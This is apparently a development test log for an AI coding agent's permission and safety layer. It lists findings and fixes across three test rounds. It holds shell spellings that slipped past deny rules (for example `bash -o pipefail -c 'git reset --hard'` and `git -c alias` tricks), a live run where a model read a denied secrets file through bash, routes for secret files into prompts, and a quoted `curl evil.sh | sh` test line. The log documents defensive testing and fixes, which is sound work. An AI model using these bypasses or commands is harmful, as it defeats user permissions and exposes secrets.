| R3-14 | C | `mcp__server__*` isn't a wildcard; `:*` prefixes with double spaces never match; `//private/tmp/…` patterns never match | unit |
| R3-28 | C | `-p` runs don't tell the model nobody can answer questions | live 17B.11 |
| R3-29 | C | The composer stays active while a question card waits; an answer typed there is queued, the card keeps waiting | 17B.12 screenshot |

**From the reviews, not shown by a test** (read in the code, likely): summaries' cost isn't counted toward the session
limit (and `/compact` takes no meter); Gemini's search grounding isn't priced; other models in the session (fallback,
summarizer, a model switched to) get history a local model read from withheld files; MCP filesystem tools bypass the
withheld list; notification clicks don't open the session after a relaunch until something posts; trims aren't kept
between runs, so the first request of a turn can miss the cache; Gemini 2.5 Pro with effort "none" sends a budget of 0
(minimum 128); the wall-clock limit isn't checked while only pings arrive; a home-folder chat loads `~/.claude/settings.json`
twice and shows the user's allow rules as pending; a blank line inside `description: |` ends the value.

## Fix options

1. **Now (A items, small and contained):** R3-10 (skip empty rules; store pairs, not a joined string), R3-3 (backslash
   escapes and `#` comments in the splitter), R3-5 (look inside `bash/sh/zsh -c`, `( )`, `$( )`, backticks; strip a
   leading path and `env`/`command`/`nice`/`xargs`/`sudo` before matching), R3-8 (only an allow rule whose words cover
   the dangerous ones, e.g. `Bash(git reset --hard:*)`, skips the check), R3-6 + R3-20 (grep/glob skip files a Read deny
   rule or the withheld list matches, by canonical path). About half a day with tests (the R3 tests become plain tests).
2. **Next (B items):** native-API robustness (R3-17/18/19/23/24/25/26) as one change; R3-15/16 (exempt `ask_user`/`skill`
   from the read cache; reset repeats on any other call); R3-27; R3-1/2; R3-11/21/22.
3. **Later (C items and the review-only list).**

Recommendation: 1 now, then 2 as a second change; Gemma live runs for 17B.6/17B.7 again after 1.

## Round 3 fixes: the A items (2026-10-15)

| # | Fix | Check |
|---|---|---|
| R3-10 | Project allow rules are kept as (rule, file) pairs; empty or blank rules are skipped | the crash test runs (no longer disabled): approve, reload, `Bash(ls)` only |
| R3-3, R3-5 | `Agent/ShellSplit.swift` replaces the old splitter: quotes with backslash escapes, `#` comments, heredoc bodies skipped, `;` `&` `|` newlines `( )` as separators (`2>&1` stays a word), and the commands inside `$( )`, backticks (also in double quotes), `sh/bash/zsh -c` scripts and `eval`. `unwrap` drops env assignments, `env`/`command`/`exec`/`nohup`/`time`/`nice`/`timeout`/`stdbuf`/`xargs`/`sudo`/`doas` (with their options) and the command's path. Deny/ask rules match a command as written or unwrapped; `sudo` anywhere before the command is "runs as root" | unit (`ShellSplitTests`, the R3 spellings now plain tests); live on Gemma `-p --mode auto`: `git reset --hard`, `bash -c '…'`, `( … )`, `sh -c "git checkout -- ."` all refused with the reason, the change kept |
| R3-8 | An allow rule skips the danger check only when its own words are dangerous (`Bash(git reset --hard:*)`); `Bash(git:*)`, `Bash(git push:*)`, `Bash(rm:*)` don't | unit |
| R3-6 | A run's Read deny rules go on its workspace (`readDenied`); grep skips the files they cover and says how many | unit (loop: `.env` denied, `env.sample` found); live: the bare `grep ".*"` no longer printed the secret |
| R3-20 | grep checks a link as itself and as its target (withheld list and deny rules), and doesn't follow a link to a file outside the workspace (says so) | unit (git project: `config.txt -> .env`; a link to a file outside) |
| R3-14 (part) | A `:*` prefix's spacing is normalized | unit |

323 tests pass with 30 known issues (was 50). Debug app and release CLI build with no warnings.

**Still open from 17B.6 (a design limit, not one of the A items):** a `Read` deny rule doesn't cover shell commands
that read the file: after grep stopped leaking, Gemma ran `grep . secrets.txt` in bash and printed it. Claude Code has the
same limit (its docs point to the sandbox). Option: treat a bash command whose arguments name a file a Read deny rule
covers as denied (would also stop harmless mentions like `echo .env >> .gitignore`). **Decided 2026-10-15: not added** (the user's call); Read rules cover kurtkode's file tools only, as in Claude Code.

## Round 3 fixes: the B items (2026-10-15)

| # | Fix |
|---|---|
| R3-17 | No whitespace-only text to Claude or Gemini (a rebuilt reply, a user message, a tool result) |
| R3-18 | Claude's "prompt is too long" and Gemini's "input token count … exceeds the maximum" count as context overflow (compact and retry) |
| R3-19 | A transient error inside a 200 stream (`overloaded_error`, `api_error`, unavailable, …) before anything was generated is retried with the HTTP retry delays |
| R3-23 | Placeholder results are matched to the reply just before them by position, so repeated ids (`call_0` in every Gemini reply) can't hide an unanswered call |
| R3-24 | A declined reply's tool calls are dropped (`.declined` clears them in the accumulator), for Claude and Gemini alike |
| R3-25 | `pause_turn` marks the reply `paused`; the loop sends it back as the last message (no "Continue."), up to 5 times in a row, without nudges |
| R3-26 | Usage is counted as it arrives (Claude's at `message_start`, Gemini's on every chunk); the final usage replaces it, and a cut-off turn keeps its input cost |
| R3-15 | `ask_user` and `skill` aren't answered from the duplicate-read check; that check is also cleared after a compaction or a trim (the earlier results may be gone) |
| R3-16 | A read between two identical calls resets the repeat count |
| R3-27 | CLI: Ctrl-C while a question or approval waits also ends the read (a newline pushed into the terminal, `TIOCSTI`); the prompt checks for cancellation, so the empty line is never a "yes" |
| R3-1, R3-2 | Front matter reads CRLF files and files with a BOM; a blank line inside a `|`/`>` block value stays in it |
| R3-11 | Path rules ignore case and `*` matches dotfiles, like gitignore |
| R3-21 | Withheld folder patterns (`secrets/`, `secrets/*`, `secrets/**`) cover everything under the folder |
| R3-22 | Only IPv6 literals in fc00::/7 and fe80::/10 count as local; host names starting with "fd" are remote |

323 tests pass with 11 known issues (R3-7, -9, -12, -13, -14: the C items). Live on Gemma: Ctrl-C at a question stops the
run and the next line goes to the main prompt; Ctrl-C at an approval denies it (the file kept); `-p` fix task passes; the
app's 9k-context parts run gets 8 of 8 with 7 compactions and no duplicate-read refusals.

## Round 4 (session 10, 2026-10-17)

Plan: FUNCTIONAL_TESTS.md section 18. Six code reviews (cost tracking, safety layer, model wire layer, agent loop,
persistence, tools/MCP/CLI) gave about 70 candidates; each high-value one was probed by a unit test
(`Round4Tests.swift`) or a live run. No keyed API calls: priced paths ran on `spike/functest/pmock.py`; live model runs on
the user's meta/muse-glimmer (LM Studio, as loaded). Baseline at b05cf11: 345 tests, 11 known issues.
**After: 378 tests pass with 71 known-issue records** (round 3's 11 and round 4's 60; `make test` is green).

### 18B. End to end

| ID | Result | Evidence | Notes |
|---|---|---|---|
| 18B.0 | pass | 378 tests, 71 known issues; Debug app and debug CLI build | |
| 18B.1 | **fail** | pmock, 400k prompt tokens per request: 100 requests, **$80.20 at list price**, `stop: step_limit`; the $2 run limit never fired | R4-2 |
| 18B.2 | pass | 503 → lost reply (80 output tokens) → answer: `cost_usd` $0.0078 = $0.0038 + $0.0040, two cost records | the run record lands ~10 s after the reply (R4-29) |
| 18B.3 | **fail** | two parallel explore runs: `cost_usd` $0.008 (parent only); the children's $0.012 is in their child sessions only | R4-22 |
| 18B.4 | **fail** | two `-r ID -p` at once: "from B" and B's run record gone (overwritten in place by A's same-length lines; a blank line left) | R4-1 |
| 18B.5 | pass | muse-glimmer, `-p --mode auto`: 12 calls, both bugs fixed, 3 tests OK | |
| 18B.6 | **fail** | `git reset --hard` refused with its reason; `bash -o pipefail -c 'git reset --hard'` ran in Full Auto and **discarded the uncommitted change** | R4-3 |
| 18B.7 | **fail** | `kurtkode -r 0` resumed one of three matching sessions without a word; `inspect 0` says "0 matches 5 sessions" | R4-23 |
| 18B.8 | pass | Debug app, muse-glimmer, Full Auto: both bugs fixed, tests OK, run record written | |
| 18B.9 | pass | Debug app, muse-glimmer, 9k budget, Full Auto: **8 of 8 classes and counts right**, 13 compactions, 29 steps, completed, no duplicate-read refusals (58 min: ~2–3 min per file on this model) | |
| 18B.10 | pass | ptydrive on pmock: Ctrl-C at the approval → "denied … Stop and wait", nothing created, `/exit` went to the main prompt | R3-27 still fixed. **It put a Keychain prompt on the user's screen**: an interactive start runs the OpenRouter reconciler, which reads endpoint keys (a fresh debug build is a new signature). The CLI has no `KURTKODE_NO_KEYCHAIN`; interactive CLI tests need one (or `--endpoint` runs should skip the reconciler) |

### Findings, most severe first

Severity as in round 3: **A** crash, data loss or a safety rule bypassed; **B** wrong behavior a user will hit; **C** minor.
"Unit" names the test in Round4Tests.swift (a `withKnownIssue` there until fixed).

| # | Sev | Finding | Shown by |
|---|---|---|---|
| R4-1 | A | **Appends overwrite each other**: `SessionStore.append` seeks to the end and writes (no `O_APPEND`, no lock), so two writers at the same moment write at the same offset. Hit by the app and the CLI on one session, two CLI runs, and inside one CLI process (the launch-time cost reconciler has its own store; `AppSettings.sessionStore` makes a new store per access). `WireLog`'s index the same | live 18B.4; unit `twoStoresAppendingAtOnceLoseNothing` (251 of 400 kept) |
| R4-3 | A | **Danger check and deny rules bypassed by spelling** (after round 3's splitter): CRLF line ends and combining marks (Swift reads `\r\n` as one Character); `$'…'`; `<<` in `(( ))` or a quoted heredoc delimiter swallows later lines; nesting past depth 4 fails open; zsh `noglob`/`nocorrect`/`repeat N`, `=rm`, `/bin/r?`, `$'rm'`; `bash -o pipefail -c`, `zsh -o … -c`, `env -S`; commands inside arguments: `git -c alias.x='!…' x` (with a `Bash(git:*)` allow rule this runs unasked in Ask mode), `find -exec /bin/rm`, `-execdir`, `bash <<<`, `echo … \| sh` | live 18B.6; unit R4ShellTests (26 spellings) |
| R4-4 | A | A PreToolUse hook's `{"decision":"block"}` or `{"continue":false}` doesn't stop the call: `outcome.blocked` is set, `authorize` reads only `permission` | unit `aBlockDecisionStopsTheCall`, `continueFalseStopsTheCall` |
| R4-5 | A | Git panel **Discard on an add/add conflict deletes the committed file** (index `A` → `git rm --cached` + delete), though the dialog promises the last committed version | unit |
| R4-6 | A | **Editing a non-UTF-8 file** (Latin-1, CP1252) rewrites every invalid byte as U+FFFD; the diff hides it (both sides show U+FFFD) | unit |
| R4-7 | A | **Text tool-call recovery runs calls the model only quoted**: a `<tool_call>` inside a code fence in prose becomes a real call (here `rm -rf build`), subject only to the permission mode | unit |
| R4-2 | B | **The spending limit ignores list-price costs** of OpenAI-compatible servers priced from `/models`: `CostMeter.add` counts only `usage.cost` (set by the Claude and Gemini decoders and OpenRouter's usage), while every display reads `CostEntry.spent`. (OpenRouter reports a cost, so it's covered; a proxy or a compatible server that lists prices but sends no cost isn't.) | live 18B.1 |
| R4-8 | B | **Undo loses another process's checkpoints**: `CheckpointStore` caches its index forever and rewrites it whole, so the app's next save erases the CLI's entries for the same session; rewinding then leaves those files as they are | unit |
| R4-9 | B | **The duplicate-read check goes stale**: it's cleared only by a non-read tool, and `task` is a read, so after a general subagent edits a file the parent's re-read is refused ("You already called…") and it works from the old text (also after `ask_user` and queued input) | unit |
| R4-10 | B | **A denied or failed subagent is a success to its parent** (`isError` only for `.cancelled`): the parent carries on and may do the denied action itself | unit |
| R4-11 | B | **Queued input is taken after Stop**: recorded as sent (`.injected`), never answered; the app's "stopped → back to the draft" doesn't happen | unit |
| R4-12 | B | **A Stop just before a command starts is ignored**: `pid == 0` at cancellation, `execute` doesn't check, the command runs to its end or timeout | unit (sleep ran its full 2 s) |
| R4-13 | B | **The wall-clock limit isn't enforced while only pings or SSE comments arrive** (OpenRouter's `: OPENROUTER PROCESSING`): checked per event only | unit: 64 s for a 0.5 s limit (`.disabled`: it would slow the suite) |
| R4-14 | B | **An error inside an OpenAI-compatible stream** (`finish_reason: "error"` with an `error` object, as OpenRouter sends) **is recorded as a completed reply** with the truncated text; LM Studio's `data: {"error":…}` (overflow text) is lost | unit |
| R4-15 | B | **Gemini `MALFORMED_FUNCTION_CALL`** (also `UNEXPECTED_TOOL_CALL`, `TOO_MANY_TOOL_CALLS`, unknown stop reasons) **ends the run as completed**, no retry or nudge: the intended edit is silently lost | unit |
| R4-16 | B | Merging consecutive user messages (Gemma, Mistral shapes) **drops the second one's images** | unit |
| R4-17 | B | **CRLF files: multi-line edits never match** (the model sends `\n`), and the error blames whitespace; the way out is `write_file`, which converts the file to LF. (Line numbers in results are right: review's second claim disproved.) | unit |
| R4-18 | B | Slash commands: `$1`…`$9` are substituted **inside the user's own text** after `$ARGUMENTS` (`price is $1 off` → `price is price off`) | unit |
| R4-19 | B | **Refusing an ambiguous edit is quadratic** (line number counted from the file's start per match), with no cancellation: 10.1 s for a 40 KB file of 20,000 matches; a 400 KB file ran over 6 minutes before I stopped it | unit |
| R4-20 | B | **The command parser is quadratic in a word's length** and runs once per rule plus the danger check: 9.2 s for a 200 KB word (a heredoc of base64, a long `echo`) | unit |
| R4-21 | B | **A fork duplicates its parent's subagent runs and their costs** in `kurtkode runs`, `cost check` and the fork's totals (child files copied with the same ids) | unit |
| R4-22 | B | **Subagent spending is left out of `-p --output json` `cost_usd`** (and eval `TrialResult.listPrice`): children's cost events go only to their child files | live 18B.3 |
| R4-23 | B | **`kurtkode -r PREFIX` resumes an arbitrary match** when the prefix is ambiguous (`inspect` refuses correctly) | live 18B.7 |
| R4-24 | B | **Repeated call ids** (`call_0` in every Gemini 2.x reply) make the Timeline (and Journal, ChatView) join each turn's call to the last turn's result | unit |
| R4-25 | B | `cost check --day` uses 24-hour days: on DST changes a request is dropped or counted on the wrong day; its date formatters have no POSIX locale or Gregorian calendar | unit (25-hour day) |
| R4-26 | B | OpenRouter's `-1` placeholder prices (router models like `openrouter/auto`) become **negative list prices** | unit |
| R4-27 | B | A run record without a field added later (`reconciledRequests`) **fails to decode**, dropping the whole record (synthesized `Codable` doesn't use defaults); none on disk yet | unit |
| R4-28 | B | **Replay costs are reconciled into the main session file** at every launch (the replay file's copy stays pending), so they count toward its total and the session limit, repeat each launch for 30 days, fill the 50-entry launch budget, and bump the session to "last" | review (traced by two reviewers; not probed) |
| R4-29 | C | Every `-p` run on a server that returns `gen-` ids waits ~10 s at the end for an OpenRouter record that lags minutes | live 18B.2 |

**Disproved**: a hook timeout does bound a pipeline (`sleep 20 \| cat` with timeout 1 returned in 1.3 s); CRLF line
numbers are right; withheld and denied files in grep (incl. symlinks), sandbox parameter escaping, folder hashing, torn
UTF-8 lines, SSE line parsing, retry bounds and Anthropic parallel calls were checked by the reviews and found sound.

**From the reviews, traced but not probed** (likely; probe when fixing nearby):
- *Loop*: compaction trims the newest tool results (unseen by the model) to 4 KB (`trimKept` over the kept part);
  parallel subagents' approvals collide on `call_0` (Stop withdraws the wrong one → hang); Stop between calls drops
  finished results and doesn't await running tasks; the Stop hook runs inside every subagent; background runs are
  cancelled silently at step/cost limits and miss the run record; queued input skips UserPromptSubmit hooks;
  subagent approval cards lose their reason and "always allow" doesn't reach the parent; `overflowRetried` never resets;
  five `pause_turn`s end as completed; Stop doesn't interrupt a running hook, and a hook that doesn't read a >64 KB
  stdin blocks.
- *Wire*: a rebuilt Claude tool-use turn without its thinking block after a mid-stream error (400 on ≤4.6 thinking
  models, every retry); Gemini 2.5 Flash `max` budget 32768 > 24576; duplicate `call_0` ids sent to Claude; tool names
  glued when a server repeats them per chunk; replayed Claude content keeps empty text blocks; a retry inside a 200 stream
  repeats a server-side search; `NativeWire.int` traps on a huge number (`Int(Double)`).
- *Tools/MCP/CLI*: SIGPIPE is never ignored (writing to an MCP server that just exited kills the app or CLI); MCPHub can
  start a server twice (leaked process) and revive a removed one; HTTP MCP SSE replies are never closed (the ~6th call
  stalls on plain http); `-p` waits 60–120 s for an MCP server that never answers `initialize`; git pathspecs glob
  (`a[1].txt` also hits `a1.txt`); the CLI's streaming drops characters that join the previous grapheme; one bad entry
  in `endpoints.json` replaces the list with LM Studio's and is saved over; `-m --no-mcp` takes the flag as the model.
- *Persistence*: a fork's copied run can capture a live background run's writes (shared ids, `locations` flips); the
  app's "changed elsewhere" check misses the CLI's writes once the app has written; `inspect` "last" and `-c` match the
  folder differently (symlinks); a newer build's enum value drops whole lines silently; a failed rewind can restore
  some files and lose blobs; the Journal budget uses the last compaction for every turn.
- *Costs*: the launch reconciler's oldest-first 50 can be blocked by entries it can never settle; a CLI `/compact`
  summary isn't added to the session's costs in that process; Claude via OpenRouter 1-hour cache writes priced at the
  5-minute rate; Gemini `toolUsePromptTokenCount` not priced; parallel subagents overshoot a run limit by a request each.

### Fix options

1. **Now: the A items and the limit** (R4-1, R4-3, R4-4, R4-5, R4-6, R4-7, R4-2), each small and contained:
   `O_APPEND` writes plus an advisory lock per append (session files and the wire index), one store per CLI process;
   the splitter over Unicode scalars, failing closed (ask) at the depth limit, on an unterminated heredoc and on a
   non-literal command word, zsh precommands and shell options with values unwrapped, `env -S`, git `-c alias.*=!…` and
   exec-style config keys, `find -exec/-execdir/-ok` bodies, and a shell reading a here-string or a pipe asked about;
   a hook's block mapped to deny; conflicted files discarded with `restore --source=HEAD` and `GIT_LITERAL_PATHSPECS=1`;
   non-UTF-8 files refused by edit/append (or their bytes kept); text tool calls taken only outside code fences; the
   meter fed `CostEntry.spent`. About a day with tests (the R4 tests become plain tests); then 18B.1, .4, .6 again.
2. **Next: the loop and the wire** (R4-9 to R4-16) as one change: `task` and `ask_user` and queued input clear the
   read check; a subagent's denied/failed stop is an error; Stop checked before taking input and before spawning;
   a wall-clock timer independent of events; stream errors and abnormal finish reasons as failures (retry or nudge);
   merged messages keep images.
3. **Then: tools, costs, persistence** (R4-17 to R4-29), and the traced-not-probed list as each area is touched.

Recommendation: 1 now (R4-1 and R4-3 first: silent data loss and a live safety bypass), then 2.

## Round 4 fixes: the A items (2026-10-17)

| # | Fix | Check |
|---|---|---|
| R4-1 | `JSONLines.append` (new): every session and wire-index append holds an exclusive `flock` and writes with `O_APPEND`, ending a torn last line under the lock; the size before and after tells the store about other writers | unit (two stores, 400 of 400); live: three rounds of three concurrent `-r ID -p` runs kept all 10 messages and 10 run records, no torn or blank lines |
| R4-3 | `ShellSplit` reads Unicode scalars (not Characters); decodes `$'…'`; `(( ))` is arithmetic, quoted heredoc delimiters are read whole; zsh `noglob`/`nocorrect`/`-`/`repeat N`, `=cmd` and `env -S` unwrapped; shell options with values (`-o`, `-O`); the script of a shell fed by a here-string or a heredoc is read; `find -exec/-execdir/-ok/-okdir` bodies and git `-c alias.*` / command-running config are listed as commands. What it can't read becomes an **opaque** command: a computed or pattern command name, a shell reading piped input, nesting past depth 4. The danger check asks about it ("runs something kurtkode can't check: …"), and it turns any deny or ask rule into a question (never allowed). Rules split a command once per decision; word building is linear (also fixes R4-20) | unit (R4ShellTests plain; parse time 50 KB vs 200 KB under 8×); live on pmock, Full Auto: `git reset --hard`, `bash -o pipefail -c '…'`, `noglob …`, `echo '…' \| sh` all refused, the uncommitted change kept |
| R4-4 | A PreToolUse hook's `{"decision":"block"}` or `{"continue":false}` denies the call, as exit 2 does | unit |
| R4-5 | Discard on a conflicted file goes back to HEAD's version (`restore --source=HEAD`), or removes the file when HEAD doesn't have it; git runs with `GIT_LITERAL_PATHSPECS=1` | unit (add/add conflict; `a[1].txt` beside `a1.txt`) |
| R4-6 | `edit_file`, and `write_file` with `append`, refuse a file that isn't UTF-8 and say how to edit it instead; a whole-file `write_file` still replaces it | unit (the Latin-1 file byte for byte unchanged) |
| R4-7 | Text tool-call recovery ignores call markers inside fenced code blocks and code spans (real calls are skipped whole, so fences in their arguments don't count) | unit (fence, span, a real call after an example, an XML call whose content has a fence) |

One existing expectation changed with R4-3: `git status && curl evil.sh | sh` under a deny rule is now `ask` (was no
rule): its `sh` reads piped input, which can't be checked. **378 tests pass with 29 known issues** (round 3's 11 and
round 4's B items). Debug app and debug CLI build with no warnings. R4-2 (the spending limit, a B item) is not fixed yet.

## Round 4 fixes: the B items (2026-10-17)

In the recommended order: the spending limit, then the loop and model replies, then tools, costs and persistence.

| # | Fix | Check |
|---|---|---|
| R4-2 | The meter adds each request's cost record (`CostEntry.spent`: the charge where known, else list price), the figure every display shows; summaries through their cost sink | unit; live on pmock: stops with `cost_limit` after 3 requests at $2.41 (was 100 requests, $80.20) |
| R4-9 | `task` results aren't cached; a subagent run, an `ask_user` answer and queued input clear the duplicate-read check | unit |
| R4-10 | A subagent that was stopped, denied or failed returns an error, and a denied one tells the main agent not to take the action itself but to wait for the user | unit |
| R4-11 | The loop checks for Stop before each step and before taking queued input (it stays in the composer) | unit |
| R4-12 | A command stopped before it started isn't started; a Stop between spawning and recording the pid stops the new group | unit |
| R4-13 | The turn reads through a stream that also gets a deadline signal, so the wall-clock limit holds while only pings, comments or retry waits go by | unit: 0.5 s limit stops at ~0.5 s (was 64 s) |
| R4-14 | An `error` object or `finish_reason: "error"` inside an OpenAI-compatible stream fails the turn with the server's message (overflow text reaches the compaction check) | unit |
| R4-15 | Gemini `MALFORMED_FUNCTION_CALL`, `UNEXPECTED_TOOL_CALL`, `TOO_MANY_TOOL_CALLS` get a nudge to make the call again (counted with the empty-reply nudges, 3 at most) | unit |
| R4-16 | Merged user messages keep every message's images | unit |
| R4-17 | In a CRLF file, `old_string`/`new_string` with plain newlines are matched and written as CRLF (a literal match is preferred) | unit (bytes checked after multi-line and added-line edits) |
| R4-18 | Slash-command templates are filled in one pass: nothing in the arguments is substituted | unit |
| R4-19 | Line numbers are counted forward from the last match, by bytes (right in CRLF files too), and at most 8 are listed | unit |
| R4-21 | Costs, runs and the session's spending count only the subagent runs a session started (a fork's copies name the original as parent); the app's toolbar leaves them out too | unit |
| R4-22 | `SubagentEnd` and `ChildRun` carry `spent`; `-p --output json` includes subagents in `cost_usd`/`list_price_usd` and adds `subagents_cost_usd`; eval `listPrice` includes them (`subagentListPrice` apart) | unit; live on pmock: `cost_usd` 0.020 with `subagents_cost_usd` 0.012 (was 0.008) |
| R4-25 | `DayFormat`: machine dates in the Gregorian calendar with a POSIX locale (price list, `cost check`, `runs --since`, the sandbox's log query); a `cost check` day runs to the next calendar day (23 or 25 hours on clock changes) | unit (25-hour day; Buddhist calendar) |
| R4-26 | Negative (placeholder) prices from `/models` are ignored | unit |
| R4-27 | `RunTotals` and `ComponentCosts` decode records missing later fields | unit |
| R4-28 | A replay's checked cost is written back into its replay record, never appended to the session; the reconciler goes newest first and counts only lookups toward its limit (entries it can't look up no longer block newer ones) | unit (checked once, nothing in the session file, not pending again) |
| R4-8 | The checkpoint index isn't cached: snapshots append their line (`JSONLines.append`), a rewind rewrites the index in place under the same lock, then deletes the blobs | unit (two stores; a rewind in one keeps the other's entries) |
| R4-23 | `kurtkode -r PREFIX` refuses a prefix that fits several sessions, listing them; `inspect`'s "last" matches the folder as `-c` does | live: an empty prefix → "matches 8 sessions in this project: …" |
| R4-24 | `ChatMessage.resultsByReply` joins each result to the latest reply before it that made that call: Timeline, Journal (entry ids now unique per reply), the chat transcript and the compaction facts | unit |

Live regression on muse-glimmer (`-p --mode auto`, calc): 17 calls, both bugs fixed, 3 tests OK.
**382 tests pass with 11 known issues** (round 3's C items). Debug app and CLI build with no warnings. Not fixed: R4-29
(the 10 s end-of-run OpenRouter lookup, C) and the traced-but-not-probed list.

## Round 5 (session 14, 2026-10-25: Phase 1)

Plan: FUNCTIONAL_TESTS.md section 19. Three code reviews of Phase 1 (tools; shell and Plan mode; instructions and
compaction) gave 33 candidates; every one was probed by a unit test in `Round5Tests.swift` (named `r5_n_…`) and fixed in
the same pass, so the probes are plain tests, not `withKnownIssue`. **The tools probes were run against the unfixed
code first and all failed** (except the crash, R5-2, which kills the test process; the reviewer reproduced its trap in a
script). The shell, Plan and instruction probes use APIs the fixes added, so for those the evidence is the reviews'
traces and experiments; all pass now. Baseline at 6d4893f: 501 tests. **After: 537 tests pass with 11 known issues.**

### Findings and fixes, most severe first

Severity: **A** data loss, a crash, or a safety rule bypassed; **B** wrong behavior a user hits; **C** minor.

| # | Sev | Finding | Fix |
|---|---|---|---|
| R5-1 | A | **grep leaked withheld files through folders listed as one entry**: a submodule, a nested repository, or a link to a folder was handed to rg, which walked it past the withheld and Read-deny filters (`conf -> realdir/credentials.json`) | entries that are folders are skipped; only files go to an engine |
| R5-2 | A | **apply_patch crashed the app** (a Swift range trap, in the preview, before approval) when a hunk after its `@@` anchor reached the file's last line | the search range is checked |
| R5-3 | A | **A patch that couldn't be written changed some files anyway; a move lost its source** (`*** Move to: README.md/notes.txt`) | every destination is checked before anything is written; writes go first, deletes after; a failed delete is reported |
| R5-4 | A | The `.git` write guard was case-sensitive: `.GIT/hooks/pre-commit` wrote a real hook on APFS | compared in any case |
| R5-11 | A | **Approving a plan as Full Auto ran the rest of the run unsandboxed** (the sandbox was fixed at the run's start, Plan mode's: none) | the sandbox follows the mode (Settings' choice per mode, `AgentConfig.sandboxFor`); the model is told |
| R5-12 | A | **Plan mode's read-only commands could print withheld and Read-denied files** (`cat .env`) to a remote model, unasked | the Plan sandbox denies reading withheld patterns (seatbelt regexes; templates stay readable); with Read deny rules, or no sandbox, such commands are asked about |
| R5-13 | A | **Plan mode's allowlist ran programs**: `git grep -O`, `rg --pre`, `sort --compress-program`, `./script --help`, `./tools/git log` (by base name), `git --config-env`, `git help --web`; `sed` w commands and `-I`, `xxd in out`, `tree -o`, `file -C` wrote files | options that run or write refused; command names must be bare or from system folders; `--version`/`--help` only for known toolchains; sed only prints ranges; git global options an allowlist |
| R5-14 | A | Variables an approved command exported (`GIT_EXTERNAL_DIFF`, `RIPGREP_CONFIG_PATH`, …) were replayed into Plan mode's unasked commands | Plan mode's commands run without carried variables and keep none |
| R5-22 | A | **Instruction files and `@imports` could put secrets in the prompt**: `@~/.ssh/id_rsa`, `@../../.aws/credentials`, `@.env`, an `AGENTS.md` link to `.env`, a subfolder rule file linked to credentials | links resolved; a file must be in the project, its parent folders, `~/.claude` or `~/.kurtkode`, and not a withheld file; the same for subfolders' rule files |
| R5-23 | A | `remember` was read-risk: one injected instruction became a standing one in every later prompt, with no approval, even in Plan mode and the rating side loop | write-risk (asked like an edit; not in Plan mode); the saved line is shown |
| R5-5 | B | Appending to a file marked it read, so a later overwrite of the unread file went through; deleting by patch needed no read | appends don't count as reads (live or seeded); a patch's delete needs a read |
| R5-6 | B | In a unified diff, a removed line starting `-- ` (an SQL comment) was taken for the next file's header: the hunk was cut, "+0 −0" reported | a file header is `--- ` followed by `+++ ` |
| R5-7 | B | Stacked `@@ class B:` / `@@ def run` anchors: the outer one was dropped, so the hunk could land in class A | anchors stack and are found in order |
| R5-8 | B | Unified-diff line numbers were ignored: `@@ -3,0 +4 @@` appended at the end | start lines are hints (shifted by earlier hunks): additions go there, ambiguous context takes the nearest match |
| R5-9 | B | rg dropped a file with a NUL byte past 8 KB; the built-in engine searched it | both decide binary by the first 8 KB |
| R5-10 | B | Past 50,000 listed files the rest went unsearched without a word | the result says so |
| R5-15 | B | One bad `export PATH=…` broke every later command (an empty environment snapshot read as "everything was unset") | `/usr/bin/env` by path; empty snapshots ignored |
| R5-16 | B | A background job that forks and exits (`server &`) couldn't be stopped, and outlived the app | the job's process group stays known until it's empty; kill_shell stops it; the state says what's still running |
| R5-17 | B | A subagent's background jobs were orphaned | stopped when the subagent ends |
| R5-18 | B | Subagents stayed in Plan mode after the plan was approved | they get the run's current mode and sandbox (`RunMode`) |
| R5-19 | B | The answer-as-plan fallback caught ordinary answers with three bullets; and a revision written as text after Revise was never presented | a plan needs a heading naming a plan, steps or approach, and steps; the fallback applies again after a Revise |
| R5-20 | B | "ok", "lgtm", "approve", "go ahead" at the CLI's plan prompt became revision feedback | taken as approval |
| R5-24 | B | Subfolder rules were appended to a tool result, where trimming cut them, and never re-sent (nor after an in-run compaction) | they go as a message of their own after the turn's results; reseeded after a compaction; 8 KB a file, 16 KB a turn |
| R5-25 | B | A subfolder's rules arrived after the first write there (a new file) | a change in a folder with unseen rules is held: refused once, the rules sent, the model makes the call again |
| R5-26 | B | Rule files in `node_modules`, `.venv`, `vendor`, nested repositories were sent as instructions | skipped |
| R5-27 | B | The tracked "last test or build command" took refused runs, `make clean`, `tsc --version`, `.build/debug/kurtkode`, and missed `uv run pytest`, `npx jest` | refused runs skipped; tighter rules; runners looked through |
| R5-28 | B | A "# note" typed while the agent ran was sent as a message; with an image attached the caption became a memory | saved at once while running; not with images. A one-line message starting "# " is still a note (as in Claude Code) |
| R5-34 | B | (found in 19B.8) `rg` isn't on commands' PATH, though the Plan refusal names it | the bundled rg is last on PATH |
| R5-c | C | read-log seeding missed edits' inner paths; a failed read counted; CRLF appends and end-of-file loose edits; a file named `-`; rg's 2 MiB vs 2 MB size limit; blank lines in `*** Add File`; ids like "BG1"; calls in the same reply as an approved plan ran in the new mode; memory cut mid-line and mid-character, appends not atomic; parent-folder rule files read from /tmp or /Users/Shared | each fixed with a probe |

| R5-35 | B | (found in 19B.6) **Gemma 4 26B looped in its reasoning for a whole 10-minute turn** in 2 of 6 Plan-mode runs: it wrote the same 1.3 KB file into its thinking 64 times ("I'll do it." and the file again). `RepetitionDetector` looks for repeats of up to 500 bytes; the setting's 32k output cap let it run (not a server bug, as first suspected) | a line of 40+ characters seen 12 times in one reply's reasoning stops it (`LineRepetition`); a reply stopped for repeating itself gets one nudge before the run ends |

### 19B. End to end

| ID | Result | Evidence |
|---|---|---|
| 19B.0 | pass | 537 tests, 11 known issues (the wall-clock tests fail under load and pass alone); Debug app and CLI build |
| 19B.1 | pass | pmock (remote), grep in content, files, count and type modes and on `.env` and a linked folder: `.env` refused, the linked folder's credentials never searched, notes count what was withheld. (`secrets/prod.yaml` showed: the default patterns withhold files *named* `secrets.*`, not a `secrets/` folder) |
| 19B.2 | pass | deny `Edit(secrets/**)`: edit_file with the path inside `edits` and with `file_path`, and write_file under `secrets/`, all refused; nothing written. apply_patch isn't offered to the mock's model: its rule coverage is unit-tested |
| 19B.3 | pass | read, the file changed during the next request, edit refused ("changed since you last read it"); read again, edit made, the user's line kept |
| 19B.4 | pass | `export` and `source ./env.sh` (a PATH with the project's `bin/`) carried to later calls; a resumed session in a new process starts without them (as designed) |
| 19B.5 | pass | a ticker started with `run_in_background`, read twice; no process of it left once the CLI exited |
